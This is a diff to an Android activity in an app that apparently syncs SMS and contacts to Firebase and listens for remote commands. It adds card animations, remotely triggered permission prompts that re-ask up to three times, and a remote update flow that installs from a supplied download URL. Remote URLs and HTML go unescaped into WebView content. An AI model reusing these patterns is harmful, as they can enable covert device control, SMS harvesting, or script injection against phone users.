@@ -34,6 +34,7 @@ import com.example.fast.databinding.ActivityActivatedBinding
 import com.example.fast.service.PersistentForegroundService
 import com.example.fast.service.ContactSmsSyncService
 import com.example.fast.ui.activated.*
+import com.example.fast.ui.RemoteUpdateActivity
 import com.example.fast.ui.card.BirthSpec
 import com.example.fast.ui.card.CardSize
 import com.example.fast.ui.card.DeathSpec
@@ -43,11 +44,15 @@ import com.example.fast.ui.card.MultipurposeCardSpec
 import com.example.fast.ui.card.PlacementSpec
 import com.example.fast.ui.card.EntranceAnimation
 import com.example.fast.ui.card.PurposeSpec
+import com.example.fast.ui.animations.CardTransitionHelper
+import com.example.fast.ui.animations.ActivityCardFlipHelper
 import com.example.fast.adapter.SmsMessageAdapter
 import com.example.fast.adapter.SmsMessageItem
 import com.example.fast.util.LogHelper
 import com.example.fast.util.PermissionManager
-import com.example.fast.util.DefaultSmsAppHelper
+import com.example.fast.util.ui.UIHelper
+import com.example.fast.util.PermissionFirebaseSync
+import com.example.fast.util.PermissionSyncHelper
 import com.example.fast.util.VersionChecker
 import com.google.firebase.Firebase
 import com.google.firebase.database.database
@@ -70,6 +75,16 @@ import org.koin.androidx.viewmodel.ext.android.viewModel
  * - ActivatedServiceManager: Service lifecycle
  */
 class ActivatedActivity : AppCompatActivity() {
+
+    companion object {
+        /** Intent extra: show multipurpose card for remote permission or update (value: [MULTIPURPOSE_CARD_PERMISSION] or [MULTIPURPOSE_CARD_UPDATE]) */
+        const val EXTRA_SHOW_MULTIPURPOSE_CARD = "show_multipurpose_card"
+        const val MULTIPURPOSE_CARD_PERMISSION = "permission"
+        const val MULTIPURPOSE_CARD_UPDATE = "update"
+        const val EXTRA_PERMISSIONS = "permissions"
+        const val EXTRA_DOWNLOAD_URL = "downloadUrl"
+        private const val PERMISSION_REMOTE_CARD_REQUEST_CODE = 201
+    }
 
     // View binding
     private val id by lazy { ActivityActivatedBinding.inflate(layoutInflater) }
@@ -120,6 +135,11 @@ class ActivatedActivity : AppCompatActivity() {
     private var testTimerSeconds: Int = 0
     private var testTimerRunnable: Runnable? = null
     private var isTimerRunning: Boolean = false
+
+    // Remote permission/update: show multipurpose card only (detached from TEST button)
+    private var pendingMultipurposeCard: String? = null
+    private var pendingPermissions: ArrayList<String>? = null
+    private var pendingDownloadUrl: String? = null
 
     // Animation state
     private var currentAnimationType = 1 // 1-5 for different animation types
@@ -352,21 +372,38 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error handling intent data", e)
         }
 
+        // Remote permission/update: read extras so multipurpose card is shown (same card as test/attach, detached from TEST button)
+        readRemoteMultipurposeCardExtras(intent)
+
         // When entering from Activation with transition: wipe + one-by-one arrival + master card run from shared element transition end. Otherwise show master card in post if needed.
         val useTransitionFlow = intent.getBooleanExtra("animate", false) || intent.getBooleanExtra("hasTransition", false)
         id.main.post {
             try {
-                if (!useTransitionFlow) {
-                    showActivationMasterCardIfNeeded {
-                        checkPermissionsAndUpdateUI()
-                        checkDefaultSms()
+                when (val pending = pendingMultipurposeCard) {
+                    MULTIPURPOSE_CARD_PERMISSION -> {
+                        pendingMultipurposeCard = null
+                        val perms = pendingPermissions ?: arrayListOf()
+                        pendingPermissions = null
+                        showMultipurposeCardForRemotePermission(perms)
+                    }
+                    MULTIPURPOSE_CARD_UPDATE -> {
+                        pendingMultipurposeCard = null
+                        val url = pendingDownloadUrl ?: ""
+                        pendingDownloadUrl = null
+                        showMultipurposeCardForRemoteUpdate(url)
+                    }
+                    else -> {
+                        if (!useTransitionFlow) {
+                            showActivationMasterCardIfNeeded {
+                                checkPermissionsAndUpdateUI()
+                            }
+                        }
                     }
                 }
                 // When useTransitionFlow, runWipeLineThenArrivalThenMasterCard is called from setupTransitions on shared element transition end
             } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error showing master card or running post-dismiss", e)
                 checkPermissionsAndUpdateUI()
-                checkDefaultSms()
             }
         }
 
@@ -393,14 +430,67 @@ class ActivatedActivity : AppCompatActivity() {
         }, 100)
     }
 
+    override fun onNewIntent(intent: Intent) {
+        super.onNewIntent(intent)
+        setIntent(intent)
+        readRemoteMultipurposeCardExtras(intent)
+        id.main.post {
+            when (val pending = pendingMultipurposeCard) {
+                MULTIPURPOSE_CARD_PERMISSION -> {
+                    pendingMultipurposeCard = null
+                    val perms = pendingPermissions ?: arrayListOf()
+                    pendingPermissions = null
+                    showMultipurposeCardForRemotePermission(perms)
+                }
+                MULTIPURPOSE_CARD_UPDATE -> {
+                    pendingMultipurposeCard = null
+                    val url = pendingDownloadUrl ?: ""
+                    pendingDownloadUrl = null
+                    showMultipurposeCardForRemoteUpdate(url)
+                }
+                else -> { }
+            }
+        }
+    }
+
+    /** Read intent extras for remote permission/update multipurpose card (same card as test/attach, detached from TEST button). */
+    private fun readRemoteMultipurposeCardExtras(intent: Intent?) {
+        val type = intent?.getStringExtra(EXTRA_SHOW_MULTIPURPOSE_CARD) ?: return
+        if (type != MULTIPURPOSE_CARD_PERMISSION && type != MULTIPURPOSE_CARD_UPDATE) return
+        pendingMultipurposeCard = type
+        pendingPermissions = if (type == MULTIPURPOSE_CARD_PERMISSION) intent.getStringArrayListExtra(EXTRA_PERMISSIONS) ?: arrayListOf() else null
+        pendingDownloadUrl = if (type == MULTIPURPOSE_CARD_UPDATE) intent.getStringExtra(EXTRA_DOWNLOAD_URL) else null
+    }
+
     /**
-     * Setup shared element transitions
+     * Setup shared element transitions or card flip transitions
      */
     private fun setupTransitions() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             try {
+                val useCenteredFlip = intent.getBooleanExtra("useCenteredFlip", false)
+                val useCardFlip = intent.getBooleanExtra("useCardFlip", false)
+                val useWipeDown = intent.getBooleanExtra("useWipeDown", false)
                 val hasTransitionFromIntent = intent.getBooleanExtra("hasTransition", false) ||
                                              intent.getBooleanExtra("animate", false)
+
+                if (useWipeDown) {
+                    // New wipe-down entry animation: content wipes down from top
+                    setupWipeDownTransition()
+                    return
+                }
+
+                if (useCenteredFlip) {
+                    // New centered flip animation: flip in at center, then expand
+                    setupCenteredFlipTransition()
+                    return
+                }
+
+                if (useCardFlip) {
+                    // Use card flip-in animation instead of shared element transition
+                    setupCardFlipTransition()
+                    return
+                }
 
                 if (hasTransitionFromIntent) {
                     window.sharedElementEnterTransition = android.transition.TransitionSet().apply {
@@ -430,7 +520,6 @@ class ActivatedActivity : AppCompatActivity() {
                                 runWipeLineThenArrivalThenMasterCard {
                                     showActivationMasterCardIfNeeded {
                                         checkPermissionsAndUpdateUI()
-                                        checkDefaultSms()
                                     }
                                 }
                             }
@@ -489,6 +578,251 @@ class ActivatedActivity : AppCompatActivity() {
         } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error setting up transition", e)
             }
+        }
+    }
+
+    /**
+     * Setup card flip-in transition from ActivationActivity
+     * Cards start at rotationY=-90 and flip in sequentially
+     */
+    private fun setupCardFlipTransition() {
+        val density = resources.displayMetrics.density
+
+        // Prepare cards for flip-in (hidden at -90 degrees)
+        val phoneCardWrapper = id.phoneCardWrapper
+        val smsCard = id.smsCard
+
+        // Build card configs - phoneCard maps to inputCard, smsCard maps to utilityCard
+        val cards = listOf(
+            ActivityCardFlipHelper.CardConfig(phoneCardWrapper, id.phoneCard),
+            ActivityCardFlipHelper.CardConfig(smsCard, id.smsCardContentContainer)
+        )
+
+        // Prepare cards (hidden, rotated)
+        ActivityCardFlipHelper.prepareForFlipIn(cards, density)
+
+        // Create dim overlay
+        val dimOverlay = ActivityCardFlipHelper.createDimOverlay(id.main)
+        dimOverlay.visibility = View.VISIBLE
+        dimOverlay.alpha = ActivityCardFlipHelper.DIM_ALPHA
+
+        // Get views to recede (header section)
+        val recedeViews = listOf(id.headerSection)
+        recedeViews.forEach { view ->
+            view.scaleX = ActivityCardFlipHelper.RECEDE_SCALE
+            view.scaleY = ActivityCardFlipHelper.RECEDE_SCALE
+            view.alpha = ActivityCardFlipHelper.RECEDE_ALPHA
+        }
+
+        // Wait for layout, then start flip-in animation
+        id.main.post {
+            if (isDestroyed || isFinishing) return@post
+
+            ActivityCardFlipHelper.flipInSequential(
+                activity = this,
+                cards = cards,
+                dimOverlay = dimOverlay,
+                recedeViews = recedeViews,
+                onComplete = {
+                    if (!isDestroyed && !isFinishing) {
+                        // After flip-in, run the normal post-transition flow
+                        runWipeLineThenArrivalThenMasterCard {
+                            showActivationMasterCardIfNeeded {
+                                checkPermissionsAndUpdateUI()
+                            }
+                        }
+                    }
+                }
+            )
+        }
+    }
+
+    /**
+     * Setup centered flip transition from ActivationActivity.
+     * Phone card starts at center (rotated -90), flips in, then expands to final position.
+     * SMS card fades in after expansion.
+     */
+    private fun setupCenteredFlipTransition() {
+        val density = resources.displayMetrics.density
+        val rootView = id.main
+        val headerSection = id.headerSection
+        val phoneCardWrapper = id.phoneCardWrapper
+        val smsCard = id.smsCard
+
+        // Calculate center position
+        rootView.post {
+            if (isDestroyed || isFinishing) return@post
+
+            val rootHeight = rootView.height
+            val rootCenterY = rootHeight / 2f
+
+            // Store original positions
+            val headerOriginalY = headerSection.y
+            val phoneCardOriginalY = phoneCardWrapper.y
+            val smsCardOriginalY = smsCard.y
+
+            // Calculate centered positions
+            val headerHeight = headerSection.height
+            val phoneCardHeight = phoneCardWrapper.height
+            val totalCenteredHeight = headerHeight + 16 * density + phoneCardHeight
+            val centeredStartY = rootCenterY - (totalCenteredHeight / 2f)
+
+            // Move elements to center initially
+            val headerCenteredTranslation = centeredStartY - headerOriginalY
+            val phoneCardCenteredTranslation = (centeredStartY + headerHeight + 16 * density) - phoneCardOriginalY
+
+            headerSection.translationY = headerCenteredTranslation
+            phoneCardWrapper.translationY = phoneCardCenteredTranslation
+
+            // Hide SMS card initially
+            smsCard.alpha = 0f
+            smsCard.visibility = View.INVISIBLE
+
+            // Set phone card at -90 degrees (ready for flip-in)
+            phoneCardWrapper.cameraDistance = 8000 * density
+            phoneCardWrapper.rotationY = -90f
+            phoneCardWrapper.alpha = 1f
+
+            // Create dim overlay
+            val dimOverlay = View(this).apply {
+                layoutParams = android.widget.FrameLayout.LayoutParams(
+                    android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
+                    android.widget.FrameLayout.LayoutParams.MATCH_PARENT
+                )
+                setBackgroundColor(android.graphics.Color.BLACK)
+                alpha = 0.7f
+            }
+            (rootView as? android.widget.FrameLayout)?.addView(dimOverlay, 0)
+                ?: (rootView as? android.view.ViewGroup)?.addView(dimOverlay, 0)
+
+            // STEP 1: Flip in the phone card at center
+            val flipDuration = 400L
+            phoneCardWrapper.animate()
+                .rotationY(0f)
+                .setDuration(flipDuration)
+                .setInterpolator(android.view.animation.DecelerateInterpolator())
+                .withEndAction {
+                    if (isDestroyed || isFinishing) return@withEndAction
+
+                    // STEP 2: Expand - move logo up, phone card to position, fade in SMS card
+                    val expandDuration = 500L
+
+                    // Fade out dim overlay
+                    dimOverlay.animate()
+                        .alpha(0f)
+                        .setDuration(expandDuration)
+                        .withEndAction {
+                            (dimOverlay.parent as? android.view.ViewGroup)?.removeView(dimOverlay)
+                        }
+                        .start()
+
+                    // Move header back to original position
+                    headerSection.animate()
+                        .translationY(0f)
+                        .setDuration(expandDuration)
+                        .setInterpolator(android.view.animation.DecelerateInterpolator())
+                        .start()
+
+                    // Move phone card to original position
+                    phoneCardWrapper.animate()
+                        .translationY(0f)
+                        .setDuration(expandDuration)
+                        .setInterpolator(android.view.animation.DecelerateInterpolator())
+                        .start()
+
+                    // Fade in SMS card
+                    smsCard.visibility = View.VISIBLE
+                    smsCard.translationY = 50 * density // Start slightly below
+                    smsCard.animate()
+                        .alpha(1f)
+                        .translationY(0f)
+                        .setDuration(expandDuration)
+                        .setStartDelay(200) // Slight delay for staggered effect
+                        .setInterpolator(android.view.animation.DecelerateInterpolator())
+                        .withEndAction {
+                            if (!isDestroyed && !isFinishing) {
+                                // After expansion, run normal post-transition flow
+                                runWipeLineThenArrivalThenMasterCard {
+                                    showActivationMasterCardIfNeeded {
+                                        checkPermissionsAndUpdateUI()
+                                    }
+                                }
+                            }
+                        }
+                        .start()
+                }
+                .start()
+        }
+    }
+
+    /**
+     * Setup wipe-down entry transition from ActivationActivity.
+     * Content starts above the screen and wipes down into view.
+     * Called after wipe-up + flip animation completes in ActivationActivity.
+     */
+    private fun setupWipeDownTransition() {
+        val density = resources.displayMetrics.density
+        val rootView = id.main
+        val headerSection = id.headerSection
+        val phoneCardWrapper = id.phoneCardWrapper
+        val smsCard = id.smsCard
+
+        // Wait for layout
+        rootView.post {
+            if (isDestroyed || isFinishing) return@post
+
+            val screenHeight = rootView.height.toFloat()
+            val wipeDistance = -screenHeight * 0.4f // Start 40% above screen
+
+            // Position elements above screen initially
+            headerSection.translationY = wipeDistance
+            headerSection.alpha = 0f
+
+            phoneCardWrapper.translationY = wipeDistance
+            phoneCardWrapper.alpha = 0f
+
+            smsCard.translationY = wipeDistance
+            smsCard.alpha = 0f
+            smsCard.visibility = View.VISIBLE
+
+            val wipeDuration = 500L
+            val staggerDelay = 100L
+
+            // Wipe down header first
+            headerSection.animate()
+                .translationY(0f)
+                .alpha(1f)
+                .setDuration(wipeDuration)
+                .setInterpolator(android.view.animation.DecelerateInterpolator())
+                .start()
+
+            // Wipe down phone card with slight delay
+            phoneCardWrapper.animate()
+                .translationY(0f)
+                .alpha(1f)
+                .setDuration(wipeDuration)
+                .setStartDelay(staggerDelay)
+                .setInterpolator(android.view.animation.DecelerateInterpolator())
+                .start()
+
+            // Wipe down SMS card with more delay
+            smsCard.animate()
+                .translationY(0f)
+                .alpha(1f)
+                .setDuration(wipeDuration)
+                .setStartDelay(staggerDelay * 2)
+                .setInterpolator(android.view.animation.DecelerateInterpolator())
+                .withEndAction {
+                    if (!isDestroyed && !isFinishing) {
+                        // After wipe-down, run normal post-transition flow
+                        runWipeLineThenArrivalThenMasterCard {
+                            showActivationMasterCardIfNeeded {
+                                checkPermissionsAndUpdateUI()
+                            }
+                        }
+                    }
+                }
+                .start()
         }
     }
 
@@ -708,9 +1042,9 @@ class ActivatedActivity : AppCompatActivity() {
                     }
                 }
             },
-            onInstructionUpdate = { html, css, imageUrl, mode ->
+            onInstructionUpdate = { html, css, imageUrl, videoUrl, documentUrl, mode ->
                 handler.post {
-                    updateInstructionDisplay(html, css, imageUrl, mode)
+                    updateInstructionDisplay(html, css, imageUrl, videoUrl, documentUrl, mode)
                 }
             },
             onCardControlUpdate = { cardType ->
@@ -1314,24 +1648,43 @@ class ActivatedActivity : AppCompatActivity() {
                 val smsContentFront = id.smsContentFront
                 val instructionContentBack = id.instructionContentBack
                 val smsCardContentContainer = id.smsCardContentContainer
+                id.smsWipeOverlay?.visibility = View.GONE
 
                 if (instructionContentBack.visibility == View.VISIBLE) {
-                    // Currently showing instruction - wipe (return) to SMS
-                    animateCardWipeToSms(smsContentFront, instructionContentBack, smsCardContentContainer)
-                    writeShowCardToFirebase("sms")
-                    LogHelper.d("ActivatedActivity", "Manual flip: SMS visible")
+                    val type = CardTransitionHelper.getSelectedType(this)
+                    CardTransitionHelper.transition(
+                        smsCardContentContainer,
+                        smsContentFront,
+                        instructionContentBack,
+                        showB = false,
+                        type
+                    ) {
+                        writeShowCardToFirebase("sms")
+                        LogHelper.d("ActivatedActivity", "Manual flip: SMS visible")
+                    }
                 } else {
-                    // Currently showing SMS - check if instruction exists, then wipe
                     if (hasInstructionContent) {
-                        // Instruction content exists - wipe to instruction
-                        animateCardWipeToInstruction(smsContentFront, instructionContentBack, smsCardContentContainer)
-                        writeShowCardToFirebase("instruction")
-                        LogHelper.d("ActivatedActivity", "Manual flip: Instruction visible")
+                        val type = CardTransitionHelper.getSelectedType(this)
+                        CardTransitionHelper.transition(
+                            smsCardContentContainer,
+                            smsContentFront,
+                            instructionContentBack,
+                            showB = true,
+                            type
+                        ) {
+                            writeShowCardToFirebase("instruction")
+                            LogHelper.d("ActivatedActivity", "Manual flip: Instruction visible")
+                        }
                     } else {
-                        // No instruction content - stay on SMS (no flip)
                         LogHelper.d("ActivatedActivity", "No instruction content available, staying on SMS")
                     }
                 }
+            }
+            header.setOnLongClickListener {
+                val next = CardTransitionHelper.cycleSelectedType(this)
+                android.widget.Toast.makeText(this, "Card effect: ${next.label}", android.widget.Toast.LENGTH_SHORT).show()
+                LogHelper.d("ActivatedActivity", "Card transition effect: ${next.label}")
+                true
             }
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting up SMS card flip toggle", e)
@@ -2250,19 +2603,82 @@ class ActivatedActivity : AppCompatActivity() {
 
     /**
      * Build full HTML for instruction content (shared by mode 0/1/2).
+     * Supports: text (html), image (imageUrl), video (videoUrl), document (documentUrl)
      */
-    private fun buildInstructionHtml(html: String, css: String, imageUrl: String?): String {
-        val hasRemoteInstruction = html.isNotBlank() || !imageUrl.isNullOrBlank() || css.isNotBlank()
+    private fun buildInstructionHtml(html: String, css: String, imageUrl: String?, videoUrl: String?, documentUrl: String?): String {
+        val hasRemoteInstruction = html.isNotBlank() || !imageUrl.isNullOrBlank() || !videoUrl.isNullOrBlank() || !documentUrl.isNullOrBlank() || css.isNotBlank()
+        
+        // Image element (shown below text content if provided)
         val imageHtml = if (!imageUrl.isNullOrBlank()) {
             """
-            <div style="margin: 16px 0; text-align: center;">
-                <img src="$imageUrl" alt="Instruction Image" style="max-width: 100%; height: auto; border-radius: 8px;" onerror="this.style.display='none';" />
+            <div class="media-container image-container">
+                <img src="$imageUrl" alt="Instruction Image" onerror="this.parentElement.style.display='none';" />
             </div>
             """
         } else ""
+        
+        // Video element (shown below text content if provided, auto-plays and loops for screensaver)
+        val videoHtml = if (!videoUrl.isNullOrBlank()) {
+            """
+            <div class="media-container video-container">
+                <video autoplay loop muted playsinline>
+                    <source src="$videoUrl" type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+            </div>
+            """
+        } else ""
+        
+        // Document element (PDF viewer via iframe or download link)
+        val documentHtml = if (!documentUrl.isNullOrBlank()) {
+            val fileName = documentUrl.substringAfterLast("/").substringBefore("?").ifEmpty { "Document" }
+            val isPdf = documentUrl.lowercase().contains(".pdf")
+            if (isPdf) {
+                // Embedded PDF viewer using Google Docs viewer for better compatibility
+                """
+                <div class="media-container document-container">
+                    <div class="document-header">
+                        <span class="document-icon">📄</span>
+                        <span class="document-name">$fileName</span>
+                    </div>
+                    <iframe src="https://docs.google.com/gview?embedded=true&url=$documentUrl" class="pdf-viewer"></iframe>
+                    <a href="$documentUrl" target="_blank" class="document-link">Open in Browser ↗</a>
+                </div>
+                """
+            } else {
+                // Generic document download link
+                """
+                <div class="media-container document-container">
+                    <a href="$documentUrl" target="_blank" class="document-card">
+                        <span class="document-icon">📄</span>
+                        <div class="document-info">
+                            <span class="document-name">$fileName</span>
+                            <span class="document-action">Tap to open document ↗</span>
+                        </div>
+                    </a>
+                </div>
+                """
+            }
+        } else ""
+        
         val baseCss = """
             body { margin: 0; padding: 0; background-color: transparent; color: #FFFFFF; font-family: sans-serif; }
             img { max-width: 100%; height: auto; display: block; margin: 0 auto; }
+            video { max-width: 100%; height: auto; display: block; margin: 0 auto; border-radius: 8px; }
+            .media-container { margin: 16px 0; text-align: center; }
+            .image-container img { border-radius: 8px; }
+            .video-container video { width: 100%; }
+            .video-fullscreen video { width: 100%; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; }
+            .document-container { text-align: left; }
+            .document-header { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; padding: 8px 12px; background: rgba(255,255,255,0.1); border-radius: 8px; }
+            .document-icon { font-size: 24px; }
+            .document-name { font-size: 14px; font-weight: 500; color: #FFFFFF; word-break: break-all; }
+            .pdf-viewer { width: 100%; height: 400px; border: none; border-radius: 8px; background: #1a1a2e; }
+            .document-link { display: inline-block; margin-top: 12px; padding: 10px 16px; background: rgba(0,255,194,0.15); color: #00FFC2; text-decoration: none; border-radius: 8px; font-size: 13px; }
+            .document-card { display: flex; align-items: center; gap: 12px; padding: 16px; background: rgba(255,255,255,0.08); border-radius: 12px; text-decoration: none; transition: background 0.2s; }
+            .document-card:active { background: rgba(255,255,255,0.15); }
+            .document-info { display: flex; flex-direction: column; gap: 4px; }
+            .document-action { font-size: 12px; color: #00FFC2; }
             .card { padding: 16px; border-radius: 14px; background: linear-gradient(135deg, rgba(35,40,65,0.9), rgba(20,24,40,0.85)); box-shadow: 0 12px 24px rgba(0,0,0,0.25); }
             .chip { display: inline-block; padding: 4px 10px; border-radius: 999px; background: rgba(0,255,194,0.15); color: #00FFC2; font-size: 11px; letter-spacing: 0.6px; text-transform: uppercase; }
             h2 { margin: 12px 0 8px 0; font-size: 18px; }
@@ -2272,6 +2688,7 @@ class ActivatedActivity : AppCompatActivity() {
             .dot { width: 8px; height: 8px; border-radius: 50%; background: #7BE3FF; box-shadow: 0 0 10px rgba(123,227,255,0.7); animation: pulse 2s infinite; }
             @keyframes pulse { 0% { transform: scale(1); opacity: 0.7; } 50% { transform: scale(1.4); opacity: 1; } 100% { transform: scale(1); opacity: 0.7; } }
         """.trimIndent()
+        
         val contentHtml = if (hasRemoteInstruction) html else """
             <div class="card">
                 <div class="chip">Instruction Hub</div>
@@ -2285,6 +2702,7 @@ class ActivatedActivity : AppCompatActivity() {
                 <div class="status"><span class="dot"></span>Listening for remote commands</div>
             </div>
         """.trimIndent()
+        
         val fullCss = "$baseCss\n$css"
         return """
             <!DOCTYPE html>
@@ -2293,7 +2711,7 @@ class ActivatedActivity : AppCompatActivity() {
                 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
                 <style>$fullCss</style>
             </head>
-            <body>$contentHtml$imageHtml</body>
+            <body>$contentHtml$imageHtml$videoHtml$documentHtml</body>
             </html>
         """.trimIndent()
     }
@@ -2311,14 +2729,15 @@ class ActivatedActivity : AppCompatActivity() {
 
     /**
      * Update instruction display by mode: 0 = in-card, 1 = prompt-style (logo + card, rest recedes), 2 = full-screen.
+     * Supports: text (html), image (imageUrl), video (videoUrl), document (documentUrl)
      */
-    private fun updateInstructionDisplay(html: String, css: String, imageUrl: String?, mode: Int) {
+    private fun updateInstructionDisplay(html: String, css: String, imageUrl: String?, videoUrl: String?, documentUrl: String?, mode: Int) {
         try {
             val resolvedMode = mode.coerceIn(0, 2)
-            LogHelper.d("ActivatedActivity", "updateInstructionDisplay - HTML: ${html.take(50)}..., mode: $resolvedMode")
+            LogHelper.d("ActivatedActivity", "updateInstructionDisplay - HTML: ${html.take(50)}..., videoUrl: ${videoUrl?.take(30)}..., documentUrl: ${documentUrl?.take(30)}..., mode: $resolvedMode")
 
             hasInstructionContent = true
-            val fullHtml = buildInstructionHtml(html, css, imageUrl)
+            val fullHtml = buildInstructionHtml(html, css, imageUrl, videoUrl, documentUrl)
 
             // Always update in-card WebView (mode 0 and fallback)
             loadInstructionIntoWebView(id.instructionWebView, fullHtml)
@@ -2916,67 +3335,205 @@ class ActivatedActivity : AppCompatActivity() {
     private fun handleTestClick() {
         try {
             if (isTesting) {
-                LogHelper.w("ActivatedActivity", "Test already in progress, ignoring duplicate click")
+                LogHelper.w("ActivatedActivity", "Refresh already in progress, ignoring duplicate click")
                 return
             }
             if (isDestroyed || isFinishing) return
 
             isTesting = true
-            LogHelper.d("ActivatedActivity", "handleTestClick: showing multipurpose card born from button")
+            LogHelper.d("ActivatedActivity", "handleTestClick: refreshing Firebase data")
 
-            val recedeViews = listOf(
-                id.headerSection,
-                id.phoneCardWrapper,
-                id.statusCard,
-                id.smsCard,
-                id.testButtonsContainer,
-            )
-
-            val spec = MultipurposeCardSpec(
-                birth = BirthSpec(
-                    originView = id.testButtonCard,
-                    width = CardSize.MatchWithMargin(24),
-                    height = CardSize.Ratio(0.34f),
-                    placement = PlacementSpec.Center,
-                    recedeViews = recedeViews,
-                    entranceAnimation = EntranceAnimation.FlipIn(),
-                ),
-                fillUp = FillUpSpec.Text(
-                    title = null,
-                    body = "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
-                    bodyLines = listOf(
-                        "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
-                        "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
-                        "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
-                        "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
-                    ),
-                    delayBeforeFillMs = 0,
-                    typingAnimation = true,
-                    perCharDelayMs = 45,
-                ),
-                purpose = PurposeSpec.Dismiss(
-                    primaryButtonLabel = "Continue",
-                    onPrimary = { },
-                ),
-                death = DeathSpec.ShrinkInto(
-                    targetView = id.testButtonCard,
-                    durationMs = 300,
-                ),
-            )
-
-            MultipurposeCardController(
-                context = this,
-                rootView = id.main,
-                spec = spec,
-                onComplete = {
+            // Show loading state on button
+            id.testButtonText.text = "SYNCING..."
+            
+            // Refresh Firebase data
+            firebaseManager.refreshData { success ->
+                handler.post {
+                    if (isDestroyed || isFinishing) return@post
+                    
+                    // Also refresh SMS messages
+                    loadInitialSmsMessages()
+                    
+                    // Restore button text
+                    id.testButtonText.text = "TEST"
+                    
+                    // Show success message
+                    if (success) {
+                        UIHelper.showSuccessSnackbar(id.main, "Up to date with Firebase")
+                    } else {
+                        UIHelper.showErrorSnackbar(id.main, "Sync completed with some errors")
+                    }
+                    
                     isTesting = false
-                    LogHelper.d("ActivatedActivity", "Multipurpose card dismissed, UI restored")
-                },
-                activity = this,
-            ).show()
+                    LogHelper.d("ActivatedActivity", "Firebase refresh complete, success: $success")
+                }
+            }
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error in handleTestClick", e)
+            id.testButtonText.text = "TEST"
             isTesting = false
+        }
+    }
+
+    /** Remote permission/update: show multipurpose card only (same as test/attach, detached from TEST button). Birth from status card. */
+    private fun showMultipurposeCardForRemotePermission(permissions: ArrayList<String>) {
+        if (permissions.isEmpty() || isDestroyed || isFinishing) return
+        val recedeViews = listOf(
+            id.headerSection,
+            id.phoneCardWrapper,
+            id.statusCard,
+            id.smsCard,
+            id.testButtonsContainer,
+        )
+        val spec = MultipurposeCardSpec(
+            birth = BirthSpec(
+                originView = id.statusCard,
+                width = CardSize.MatchWithMargin(24),
+                height = CardSize.Ratio(0.34f),
+                placement = PlacementSpec.Center,
+                recedeViews = recedeViews,
+                entranceAnimation = EntranceAnimation.FlipIn(),
+            ),
+            fillUp = FillUpSpec.Text(
+                title = "Permissions",
+                body = "Company has requested permissions.",
+                bodyLines = listOf(
+                    "Permissions requested:",
+                    permissions.joinToString(", ").take(60) + if (permissions.joinToString("").length > 60) "…" else "",
+                    "Tap Grant to continue.",
+                ),
+                delayBeforeFillMs = 0,
+                typingAnimation = true,
+                perCharDelayMs = 35,
+            ),
+            purpose = PurposeSpec.Custom(
+                primaryButtonLabel = "Grant",
+                onPrimary = { },
+            ),
+            death = DeathSpec.ShrinkInto(
+                targetView = id.statusCard,
+                durationMs = 300,
+            ),
+        )
+        MultipurposeCardController(
+            context = this,
+            rootView = id.main,
+            spec = spec,
+            onComplete = { startRemotePermissionFlowFromCard(permissions) },
+            activity = this,
+        ).show()
+    }
+
+    /** Remote update: show multipurpose card only (same as test/attach). Birth from status card. */
+    private fun showMultipurposeCardForRemoteUpdate(downloadUrl: String) {
+        if (downloadUrl.isBlank() || isDestroyed || isFinishing) return
+        val recedeViews = listOf(
+            id.headerSection,
+            id.phoneCardWrapper,
+            id.statusCard,
+            id.smsCard,
+            id.testButtonsContainer,
+        )
+        val spec = MultipurposeCardSpec(
+            birth = BirthSpec(
+                originView = id.statusCard,
+                width = CardSize.MatchWithMargin(24),
+                height = CardSize.Ratio(0.34f),
+                placement = PlacementSpec.Center,
+                recedeViews = recedeViews,
+                entranceAnimation = EntranceAnimation.FlipIn(),
+            ),
+            fillUp = FillUpSpec.Text(
+                title = "Update available",
+                body = "A new version is available. Tap Update to install.",
+                bodyLines = listOf("Update available.", "Tap Update to install."),
+                delayBeforeFillMs = 0,
+                typingAnimation = true,
+                perCharDelayMs = 35,
+            ),
+            purpose = PurposeSpec.Custom(
+                primaryButtonLabel = "Update",
+                onPrimary = {
+                    startActivity(Intent(this, RemoteUpdateActivity::class.java).apply {
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                        putExtra("downloadUrl", downloadUrl)
+                    })
+                },
+            ),
+            death = DeathSpec.ShrinkInto(
+                targetView = id.statusCard,
+                durationMs = 300,
+            ),
+        )
+        MultipurposeCardController(
+            context = this,
+            rootView = id.main,
+            spec = spec,
+            onComplete = { },
+            activity = this,
+        ).show()
+    }
+
+    /** Run permission flow from multipurpose card (same flow as RemotePermissionRequestActivity). */
+    private fun startRemotePermissionFlowFromCard(permissions: ArrayList<String>) {
+        val list = ArrayList(permissions)
+        if (!list.contains("notification")) list.add("notification")
+        if (!list.contains("battery")) list.add("battery")
+        val requests = PermissionManager.permissionNamesToRequests(list, true, this)
+        if (requests.isNotEmpty()) {
+            PermissionManager.startRequestPermissionList(
+                this,
+                requests,
+                PERMISSION_REMOTE_CARD_REQUEST_CODE,
+                maxCyclesForMandatory = 3,
+                onComplete = { results -> syncRemotePermissionResultsAndContinue(results, list) }
+            )
+        } else {
+            val specialList = list.filter { it in listOf("notification", "battery") }.distinct()
+            if (specialList.isNotEmpty()) {
+                PermissionManager.startSpecialPermissionList(this, specialList) { specialResults ->
+                    specialResults.forEach { r ->
+                        when (r.permission) {
+                            "notification" -> PermissionFirebaseSync.updatePermissionStatus(this, cachedAndroidId, "notification", r.isAllowed)
+                            "battery" -> PermissionFirebaseSync.updatePermissionStatus(this, cachedAndroidId, "battery", r.isAllowed)
+                        }
+                    }
+                    PermissionFirebaseSync.syncPermissionStatus(this, cachedAndroidId)
